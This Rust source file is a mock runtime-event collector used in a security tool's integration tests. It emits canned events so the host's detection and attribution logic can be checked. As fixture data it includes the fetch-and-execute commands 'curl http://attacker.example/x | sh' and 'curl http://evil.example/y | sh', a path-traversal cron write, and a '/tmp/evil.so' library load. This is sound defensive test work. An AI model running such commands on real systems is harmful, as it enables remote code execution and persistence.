// SPDX-License-Identifier: Apache-2.0

//! Mock runtime-event collector sidecar (#60), used only by the Linux CLI
//! integration test for `--collector <PATH>`.
//!
//! It speaks the real `bhf.collector-event.v1` JSONL protocol: it reads its
//! context from the `BHF_COLLECTOR_*` environment the host sets, renders a canned
//! observation with [`runtime_collector::mock::MockCollector`], and writes the
//! JSONL stream to the sink named by `BHF_COLLECTOR_LOG` (or stdout). The canned
//! scenario is selected by `BHF_MOCK_SCENARIO`; a real provider would instead
//! observe the live target, but the wire contract the host consumes is identical,
//! which is exactly what this exercises on a Linux runner with no OS tracer.

use runtime_collector::mock::{MockCollector, MockEffect};
use runtime_collector::schema::{EventKind, Fidelity};
use runtime_collector::CollectorContext;

/// A direct-child effect of the testcase root (pid 1000), attributed to the tree.
fn child(kind: EventKind, ts_offset: f64) -> MockEffect {
    MockEffect {
        kind,
        pid: 1001,
        parent: Some(1000),
        ancestor: Some(1000),
        image: None,
        path: None,
        args: Vec::new(),
        verb: None,
        address: None,
        input_derived: false,
        taint_offset: None,
        ts_offset,
    }
}

/// All three positive classes in one observation: a fuzz-controlled process
/// execution, a path escaping the allowed root, and a controlled library load.
fn positive_all() -> MockCollector {
    let mut exec = child(EventKind::ShellExecute, 1.0);
    exec.image = Some("/bin/sh".into());
    exec.verb = Some("exec".into());
    exec.args = vec!["-c".into(), "curl http://attacker.example/x | sh".into()];
    exec.input_derived = true;
    exec.taint_offset = Some(0);

    let mut write = child(EventKind::FileWrite, 2.0);
    write.path = Some("../../etc/cron.d/payload".into());
    write.input_derived = true;
    write.taint_offset = Some(4);

    let mut load = child(EventKind::ModuleLoad, 3.0);
    load.path = Some("/tmp/evil.so".into());
    load.input_derived = true;
    load.taint_offset = Some(8);

    MockCollector::new(1000, "/srv/sandbox/target")
        .with_effect(exec)
        .with_effect(write)
        .with_effect(load)
}

/// An effect of an UNRELATED process (pid 7777, parented outside the testcase
/// tree): it is emitted into the sink but must be EXCLUDED by the host's
/// descendant-tree attribution, never attributed to the replayed testcase (#76).
fn unrelated(kind: EventKind, ts_offset: f64) -> MockEffect {
    MockEffect {
        kind,
        pid: 7777,
        parent: Some(6666),
        ancestor: Some(6666),
        image: None,
        path: None,
        args: Vec::new(),
        verb: None,
        address: None,
        input_derived: false,
        taint_offset: None,
        ts_offset,
    }
}

fn collector_for(scenario: &str) -> MockCollector {
    match scenario {
        "process_exec" => MockCollector::process_exec(),
        "path_control" => MockCollector::path_control(),
        "controlled_library_load" => MockCollector::controlled_library_load(),
        "fixed_constants" => MockCollector::fixed_constants(),
        // A degraded run: lost events / permission denial must never be reported
        // clean (AC #6). Carries the three positive effects plus a loss signal.
        "lossy" => positive_all().with_fidelity(Fidelity {
            lost: 3,
            permission_denied: true,
            unsupported_fields: vec!["process.token".into()],
        }),
        // The three positive effects PLUS a concurrent unrelated process's exec:
        // the unrelated event is in the stream but out of the testcase tree, so the
        // host must exclude it (no finding, not in the process tree).
        "unrelated_excluded" => {
            let mut unrelated_exec = unrelated(EventKind::ShellExecute, 1.5);
            unrelated_exec.image = Some("/bin/sh".into());
            unrelated_exec.verb = Some("exec".into());
            unrelated_exec.args = vec!["-c".into(), "curl http://evil.example/y | sh".into()];
            unrelated_exec.input_derived = true;
            unrelated_exec.taint_offset = Some(0);
            positive_all().with_effect(unrelated_exec)
        }
        // Default: all three positive classes.
        _ => positive_all(),
    }
}

fn env_u32(key: &str, default: u32) -> u32 {
    std::env::var(key)
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(default)
}

fn env_u64(key: &str, default: u64) -> u64 {
    std::env::var(key)
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(default)
}

/// Write the JSONL sink to `BHF_COLLECTOR_LOG` (or stdout), exiting non-zero on an
/// I/O error.
fn write_sink(jsonl: &str) {
    match std::env::var("BHF_COLLECTOR_LOG") {
        Ok(path) if !path.is_empty() => {
            if let Err(e) = std::fs::write(&path, jsonl.as_bytes()) {
                eprintln!("mock_collector: failed to write sink {path}: {e}");
                std::process::exit(1);
            }
        }
        _ => print!("{jsonl}"),
    }
}

/// Signal the #76 readiness ack: touch `BHF_COLLECTOR_READY` so the host can
/// confirm the collector is live and watching before it would run the replayed
/// target. A real provider does this once its tracing session is live.
fn signal_ready() {
    if let Ok(path) = std::env::var("BHF_COLLECTOR_READY") {
        if !path.is_empty() {
            let _ = std::fs::write(&path, b"ready");
        }
    }
}

fn main() {
    let testcase = std::env::var("BHF_COLLECTOR_TESTCASE").unwrap_or_else(|_| "tc-0".to_owned());
    let worker = env_u32("BHF_COLLECTOR_WORKER", 0);
    let root = std::env::var("BHF_COLLECTOR_ROOT").unwrap_or_else(|_| "/srv/sandbox".to_owned());
    let window_ms = env_u64("BHF_COLLECTOR_WINDOW_MS", 250);
    let scenario = std::env::var("BHF_MOCK_SCENARIO").unwrap_or_else(|_| "positive_all".to_owned());

    // #76 degraded-routing scenarios: exercise the host's not-observed handling.
    match scenario.as_str() {
        // Never ack readiness, then exit cleanly: the host must detect the missing
        // ack (early exit / timeout) and record a degraded, not-observed run.
        "no_ready" => std::process::exit(0),
        // Ack readiness, then fail the capture (non-zero exit, no sink written).
        "capture_failed" => {
            signal_ready();
            std::process::exit(7);
        }
        // Ack readiness and exit cleanly, but produce NO events for the testcase:
        // the host must treat this as not-observed, never a clean assurance.
        "unobserved" => {
            signal_ready();
            write_sink("");
            return;
        }
        _ => {}
    }

    // Normal scenarios: ack readiness, then emit the canned observation.
    signal_ready();

    let ctx = CollectorContext::new(testcase, worker, root, window_ms);
    let collector = collector_for(&scenario);

    let mut jsonl = String::new();
    for ev in collector.events(&ctx) {
        jsonl.push_str(&ev.to_jsonl_line());
        jsonl.push('\n');
    }
    write_sink(&jsonl);
}
